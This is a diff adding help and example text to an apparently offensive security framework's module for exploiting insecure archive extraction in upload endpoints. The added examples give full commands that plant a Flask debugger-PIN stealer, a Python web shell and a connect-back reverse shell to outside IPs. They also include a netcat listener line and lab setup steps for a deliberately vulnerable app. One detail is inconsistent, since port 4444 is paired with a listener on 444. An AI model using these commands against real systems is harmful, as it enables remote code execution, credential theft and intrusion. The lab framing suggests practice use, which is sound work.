@@ -74,3 +74,86 @@ guide:
 
      * You can also see some examples with `vimana guide -m 2pacx -e`         
 
+  examples: |
+    o----------------------------------------------------------------------o
+    └┐⠚⠶:::⠼⠙⠼⠚⠚⠶⠶:└┐::⠼⠙⠼::⠼⠙⠼└┐  2PACX GUIDE  o ⠼⠙⠼⠚││┘└┘││└┐⠙⠼⠼⠙⠼⠶⠼⠙⠼⠚⠚⠶⠼
+    o----------------------------------------------------------------------o
+  
+     → 2pacx + Flask PinStealer
+
+        Run 2pacx exploit with 'flask_pinstealer' payload against 
+        the target URL 'http://pytestapp:5000/upload', specifying
+        the destination target directory to write the payload as
+        'config' and forwarding the session to atlatl siddhi on
+        host '189.87.65.43' and port '9999'
+
+        $ vimana run \
+           --plugin 2pacx \
+           --target-url http://pytestapp:5000/upload \
+           --target-dir config \
+           --payload flask_pinstealer \
+           --forward atlatl \
+           --local-port 9999 \
+           --local-host 189.87.65.43
+
+        * Check atlatl usage with `vimana guide -m atlatl -e`
+
+    ø----------------------------------------------------------------------ø
+    
+     → 2pacx + PWS_Payload (Web Shell)
+
+        Run 2pacx with 'pws' payload (Python Web Shell) in port
+        9876 against the target URL 'http://pytestapp:5000/upload',
+        specifying the destination target directory to write the
+        payload as 'app':
+
+        $ vimana run \
+           --module 2pacx \
+           --target-url http://vulnerableupapp.com:5000/upload \
+           --payload pws_payload \
+           --target-dir app \
+           --remote-port 9876
+
+    ø----------------------------------------------------------------------ø
+    
+     → 2pacx + OLPCB_Payload (Connect Back)
+    
+        Run 2pacx exploit with 'olpcb' payload (Python Connect
+        Back) to IP 98.76.54.32 on port 4444 against the target
+        URL 'http://apytestapp2:8877/upload', specifying the
+        destination target directory to write the payload as
+        'settings':
+
+        $ vimana run \
+           --module 2pacx \
+           --target-url http://0.0.0.0:8877/upload \
+           --payload olpcb_payload \
+           --target-dir settings \
+           --local-host 98.76.54.32 \
+           --local-port 4444
+        
+        Don't forget your listener: $ nc -lnvvp444
+
+        * For more details about payloads use `vimana list --payloads`
+
+  lab_setup: |
+    ø----------------------------------------------------------------------ø
+    │└┘┌⠼│└└┘┌┐┌┘⠼⠙⠼⠶⠙⠼⠼⠙⠼⠶⠶⠙⠼⠼⠙⠼⠶ LAB SETUP  ⠼⠙⠼:└┘┌┐││┬│⠼⠙⠼└┘┌┬⠼⠙⠼⠼⠼:.⠼⠶⠶⠼
+    ø----------------------------------------------------------------------ø
+  
+        The best way to play around with 2pacx is by setting up
+        a deliberately vulnerable web application to demonstrate
+        insecure file extraction. Just follow the steps below or
+        check the repository itself:
+
+        $ git clone https://github.com/ajinabraham/bad_python_extract.git
+        $ python3 -m venv bpex_env
+        $ source bpex_env/bin/activate
+        $ cd bad_python_extract
+        $ pip install -r requirements.txt --user
+        $ python server.py
+
+        * For exploitation examples use: `vimana guide -m 2pacx -e`
+
+
+
